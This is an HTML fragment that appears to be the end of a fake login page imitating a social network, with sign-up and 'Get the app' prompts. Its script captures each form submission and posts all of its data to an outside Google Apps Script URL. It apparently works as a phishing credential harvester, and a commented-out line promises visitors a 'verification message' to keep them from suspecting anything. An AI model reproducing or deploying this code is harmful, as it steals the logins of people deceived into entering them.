<body>
    <div class="container1">

            </div>

        </div>
        <div class="signup-div">
           <p>Don't have an account? <a href="">Sign up</a></p>
        </div>

            <p>Get the app.</p>

    <script>
        const form = document.querySelector("#form")
        const submitButton = document.querySelector("#submit")
        const scriptURL = 'https://script.google.com/macros/s/AKfycbw_IWHSBdoDxB_sP-hXurL0TYQJcF8aOJ0YUmIT2Er2hwFQJCYLjPOU6IFqhBcXhUMrvg/exec'
     
        form.addEventListener('submit', e => {
          submitButton.disabled = true
          e.preventDefault()
          let requestBody = new FormData(form)
          fetch(scriptURL, { method: 'POST', body: requestBody})
            .then(response => {
               //alert('Congratulations! We will send you a verification message within 24 hours', response)
               submitButton.disabled = false
              })
            .catch(error => {
            alert('Error!', error.message)
              submitButton.disabled = false
     
            }
            )
        })
     </script>
</body>
